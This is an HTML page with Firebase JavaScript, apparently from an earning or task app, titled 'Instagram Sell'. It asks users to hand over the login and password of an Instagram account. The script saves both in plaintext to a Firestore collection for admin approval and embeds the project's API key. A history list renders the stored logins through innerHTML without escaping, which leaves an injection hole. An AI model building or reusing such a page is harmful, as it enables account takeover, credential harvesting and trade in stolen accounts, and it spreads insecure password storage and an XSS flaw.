<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<title>Instagram Sell</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#12002b;
  color:#fff;
}
.header{
  padding:16px;
  font-size:22px;
  font-weight:bold;
}
.box{
  background:#2a0d4f;
  margin:12px;
  padding:14px;
  border-radius:12px;
}
input{
  width:100%;
  padding:12px;
  margin-bottom:10px;
  border-radius:8px;
  border:none;
  font-size:15px;
}
button{
  width:100%;
  padding:12px;
  border:none;
  border-radius:20px;
  font-weight:bold;
  background:#00e6a7;
  cursor:pointer;
}
.item{
  background:#3a1b6b;
  margin-top:10px;
  padding:10px;
  border-radius:10px;
  font-size:14px;
}
.pending{ color:#ffcc00; }
.approved{ color:#00ff99; }
.rejected{ color:#ff6666; }
</style>
</head>

<body>

<div class="header">INSTAGRAM SELL</div>

<!-- SELL FORM -->
<div class="box">
  <input id="login"
    placeholder="Email / Phone Number / User ID">
  <input id="password"
    placeholder="Password"
    type="password">
  <button onclick="submitSell()">SUBMIT</button>
</div>

<!-- HISTORY -->
<div class="box">
  <b>Sell History</b>
  <div id="history"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-auth.js";
import {
  getFirestore, collection, addDoc, query,
  where, getDocs, serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDIETvBYGyPXKDYi_H7J4Fcxv2Ir_AN6M8",
  authDomain: "olyotaskbot-7019e.firebaseapp.com",
  projectId: "olyotaskbot-7019e",
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let uid = "";

onAuthStateChanged(auth,(user)=>{
  if(!user){
    alert("আগে লগইন করো");
    return;
  }
  uid = user.uid;
  loadHistory();
});

window.submitSell = async function(){
  const login = document.getElementById("login").value.trim();
  const pass  = document.getElementById("password").value.trim();

  if(!login || !pass){
    alert("সব ফিল্ড পূরণ করো");
    return;
  }

  await addDoc(collection(db,"instagram_sell"),{
    uid: uid,
    login: login,
    pass: pass,
    status: "pending",
    createdAt: serverTimestamp()
  });

  alert("⏳ Pending for admin approval");

  document.getElementById("login").value = "";
  document.getElementById("password").value = "";

  loadHistory();
}

async function loadHistory(){
  const q = query(
    collection(db,"instagram_sell"),
    where("uid","==",uid)
  );

  const snap = await getDocs(q);
  const box = document.getElementById("history");
  box.innerHTML = "";

  snap.forEach(d=>{
    const s = d.data().status;
    box.innerHTML += `
      <div class="item ${s}">
        ${d.data().login}<br>
        Status: ${s.toUpperCase()}
      </div>
    `;
  });
}
</script>

</body>
</html>
